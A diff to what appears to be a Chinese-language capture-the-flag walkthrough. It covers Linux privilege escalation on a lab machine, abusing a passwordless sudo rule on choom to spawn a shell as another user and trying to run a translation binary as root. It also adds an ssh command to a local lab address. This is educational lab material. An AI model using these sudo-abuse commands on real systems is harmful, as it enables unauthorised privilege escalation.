@@ -88,11 +88,11 @@ sudo -l
 //发现有个(india) NOPASSWD: /usr/bin/choom   这可以让我免密提权至india用户权限
 ```
 
+也可以直接ssh：`ssh ocean@192.168.44.134
 
 **choom**      命令是 util-linux 软件包的一部分
 不会用这个命令就去找man：[choom(1) - Linux manual page](https://man7.org/linux/man-pages/man1/choom.1.html)
 [Ubuntu Manpage: choom - display and adjust OOM-killer score.](https://manpages.ubuntu.com/manpages/focal/en/man1/choom.1.html)
-
 
 ```C
 sudo -u india /usr/bin/choom -n 0 /bin/sh
@@ -101,5 +101,5 @@ script /dev/null -c bash
 
 ```C
 sudo -l //(root) NOPASSWD: /usr/local/bin/trans
-
+sudo -u root /usr/local/bin/trans//尝试以root权限运行该翻译软件
 ```
